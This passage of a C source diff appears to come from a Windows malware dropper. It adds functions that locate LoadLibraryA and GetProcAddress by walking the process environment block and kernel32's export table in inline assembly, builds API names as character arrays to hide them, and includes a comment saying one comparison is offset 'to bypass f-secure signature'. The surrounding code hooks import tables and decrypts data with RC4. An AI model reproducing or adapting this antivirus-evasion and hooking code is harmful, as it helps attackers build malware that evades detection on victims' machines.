 	while (header->synchro != 1)
 		pfn_Sleep(100);
-	
-	MESSAGE(STRING(STRIDX_VECTORQUIT));
 		
 	pfn_OriginalExit(status);
 }
@@ -875,9 +782,16 @@ void arc4(const unsigned char *key, size_t keylen, size_t skip,
 	unsigned char *pos;
 	size_t kpos;
 	
-	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
-	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
-	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
+	LOADLIBRARY pfn_LoadLibrary = resolveLoadLibrary();
+	GETPROCADDRESS pfn_GetProcAddress = resolveGetProcAddress();
+
+	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	char strVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
+	char strVirtualFree[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0x0 };
+
+	HMODULE hMod = pfn_LoadLibrary(strKernel32);
+	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) pfn_GetProcAddress(hMod, strVirtualAlloc);
+	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) pfn_GetProcAddress(hMod, strVirtualFree);
 	
 	unsigned char *S = (unsigned char*) pfn_VirtualAlloc(NULL, 256, MEM_COMMIT, PAGE_READWRITE);
 	
@@ -910,7 +824,7 @@ void arc4(const unsigned char *key, size_t keylen, size_t skip,
 		S_SWAP(i, j);
 		*pos++ ^= S[(S[i] + S[j]) & 0xff];
 	}
-	
+
 	pfn_VirtualFree(S, 0, MEM_RELEASE);
 }
 FUNCTION_END(arc4);
@@ -919,12 +833,23 @@ FUNCTION_END(arc4);
 DWORD HookCall(char* dll, char* name, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, DropperHeader *header)
 {
 	DWORD* dll_calls = (DWORD*) (((char*)header) + header->callAddresses.offset);
-	VIRTUALQUERY pfn_VirtualQuery = (VIRTUALQUERY) dll_calls[CALL_VIRTUALQUERY];
-	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) dll_calls[CALL_VIRTUALALLOC];
-	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) dll_calls[CALL_VIRTUALFREE];
-	VIRTUALPROTECT pfn_VirtualProtect = (VIRTUALPROTECT) dll_calls[CALL_VIRTUALPROTECT];
-	GETPROCADDRESS pfn_GetProcAddress = (GETPROCADDRESS) dll_calls[CALL_GETPROCADDRESS];
-	GETMODULEHANDLE pfn_GetModuleHandle = (GETMODULEHANDLE) dll_calls[CALL_GETMODULEHANDLE];
+
+	LOADLIBRARY pfn_LoadLibrary = resolveLoadLibrary();
+	GETPROCADDRESS pfn_GetProcAddress = resolveGetProcAddress();
+
+	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	char strVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
+	char strVirtualQuery[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'Q', 'u', 'e', 'r', 'y', 0x0 };
+	char strVirtualFree[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0x0 };
+	char strVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
+	char strGetModuleHandle[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0x0 };
+
+	HMODULE hMod = pfn_LoadLibrary(strKernel32);
+	VIRTUALQUERY pfn_VirtualQuery = (VIRTUALQUERY) pfn_GetProcAddress(hMod, strVirtualQuery);
+	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) pfn_GetProcAddress(hMod, strVirtualAlloc); 
+	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) pfn_GetProcAddress(hMod, strVirtualFree);
+	VIRTUALPROTECT pfn_VirtualProtect = (VIRTUALPROTECT) pfn_GetProcAddress(hMod, strVirtualProtect);
+	GETMODULEHANDLE pfn_GetModuleHandle = (GETMODULEHANDLE) pfn_GetProcAddress(hMod, strGetModuleHandle);
 
 #ifdef _DEBUG
 	DWORD * stringsOffsets = (DWORD *) (((char*)header) + header->stringsOffsets.offset);
@@ -1125,4 +1050,164 @@ __forceinline bool fuckUnicodeButCompare(PBYTE against ,PBYTE unicode, DWORD len
 	}
 	
 	return true;
+}
+
+__forceinline GETPROCADDRESS resolveGetProcAddress()
+{
+	PEB_LIST_ENTRY* head;
+	DWORD **pPEB;
+	DWORD *Ldr;
+	
+	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	char strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };
+
+	__asm {
+		mov eax,30h
+		mov eax,DWORD PTR fs:[eax]
+		add eax, 08h
+		mov ss:[pPEB], eax
+	}
+	
+	Ldr = *(pPEB + 1);
+	head = (PEB_LIST_ENTRY *) *(Ldr + 3);
+	
+	PEB_LIST_ENTRY* entry = head;
+	do {		
+		DWORD imageBase = entry->ImageBase;
+		if (imageBase == NULL)
+			goto NEXT_ENTRY;
+		
+		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*) entry->ImageBase;
+		IMAGE_NT_HEADERS32* ntHeaders = (IMAGE_NT_HEADERS32*) (entry->ImageBase + dosHeader->e_lfanew);
+		
+		// *** check if we have an export table
+		if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL)
+			goto NEXT_ENTRY;
+		
+		// *** get EXPORT table
+		IMAGE_EXPORT_DIRECTORY* exportDirectory = 
+			(IMAGE_EXPORT_DIRECTORY*) (imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+		
+		// *** check for valid module name
+		char* moduleName = (char*)(imageBase + exportDirectory->Name);
+		if (moduleName == NULL)
+			goto NEXT_ENTRY;
+		
+		if ( ! _STRCMPI_(moduleName+1, strKernel32+1) ) // +1 to bypass f-secure signature
+		{
+			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
+			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
+			if (exportDirectory->AddressOfNameOrdinals == NULL) goto NEXT_ENTRY;
+			
+			DWORD* Functions = (DWORD*) (imageBase + exportDirectory->AddressOfFunctions);
+			DWORD* Names = (DWORD*) (imageBase + exportDirectory->AddressOfNames);			
+			WORD* NameOrds = (WORD*) (imageBase + exportDirectory->AddressOfNameOrdinals);
+			
+			// *** get pointers to LoadLibraryA and GetProcAddress entry points
+			for (WORD x = 0; x < exportDirectory->NumberOfFunctions; x++)
+			{
+				if (Functions[x] == 0)
+					continue;
+				
+				for (WORD y = 0; y < exportDirectory->NumberOfNames; y++)
+				{
+					if (NameOrds[y] == x)
+					{
+						char *name = (char *) (imageBase + Names[y]);
+						if (name == NULL)
+							continue;
+						
+						if (!_STRCMPI_(strGetProcAddress, name))
+							return (GETPROCADDRESS)(imageBase + Functions[x]);
+						break;
+					}
+				}
+			}
+		}
+NEXT_ENTRY:
+		entry = (PEB_LIST_ENTRY *) entry->InLoadNext;
+	
+	} while (entry != head);
+
+	return 0;
+}
+
+__forceinline LOADLIBRARY resolveLoadLibrary()
+{
+	PEB_LIST_ENTRY* head;
+	DWORD **pPEB;
+	DWORD *Ldr;
+	
+	char strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };
+	char strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x0 };
+
+	__asm {
+		mov eax,30h
+		mov eax,DWORD PTR fs:[eax]
+		add eax, 08h
+		mov ss:[pPEB], eax
+	}
+	
+	Ldr = *(pPEB + 1);
+	head = (PEB_LIST_ENTRY *) *(Ldr + 3);
+	
+	PEB_LIST_ENTRY* entry = head;
+	do {		
+		DWORD imageBase = entry->ImageBase;
+		if (imageBase == NULL)
+			goto NEXT_ENTRY;
+		
+		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*) entry->ImageBase;
+		IMAGE_NT_HEADERS32* ntHeaders = (IMAGE_NT_HEADERS32*) (entry->ImageBase + dosHeader->e_lfanew);
+		
+		// *** check if we have an export table
+		if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL)
+			goto NEXT_ENTRY;
+		
+		// *** get EXPORT table
+		IMAGE_EXPORT_DIRECTORY* exportDirectory = 
+			(IMAGE_EXPORT_DIRECTORY*) (imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+		
+		// *** check for valid module name
+		char* moduleName = (char*)(imageBase + exportDirectory->Name);
+		if (moduleName == NULL)
+			goto NEXT_ENTRY;
+		
+		if ( ! _STRCMPI_(moduleName+1, strKernel32+1) ) // +1 to bypass f-secure signature
+		{
+			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
+			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
+			if (exportDirectory->AddressOfNameOrdinals == NULL) goto NEXT_ENTRY;
+			
+			DWORD* Functions = (DWORD*) (imageBase + exportDirectory->AddressOfFunctions);
+			DWORD* Names = (DWORD*) (imageBase + exportDirectory->AddressOfNames);			
+			WORD* NameOrds = (WORD*) (imageBase + exportDirectory->AddressOfNameOrdinals);
+			
+			// *** get pointers to LoadLibraryA and GetProcAddress entry points
+			for (WORD x = 0; x < exportDirectory->NumberOfFunctions; x++)
+			{
+				if (Functions[x] == 0)
+					continue;
+				
+				for (WORD y = 0; y < exportDirectory->NumberOfNames; y++)
+				{
+					if (NameOrds[y] == x)
+					{
+						char *name = (char *) (imageBase + Names[y]);
+						if (name == NULL)
+							continue;
+						
+						if (!_STRCMPI_(strLoadLibraryA, name))
+							return (LOADLIBRARY)(imageBase + Functions[x]);
+						break;
+					}
+				}
+			}
+		}
+NEXT_ENTRY:
+		entry = (PEB_LIST_ENTRY *) entry->InLoadNext;
+	
+	} while (entry != head);
+
+	return 0;
 }
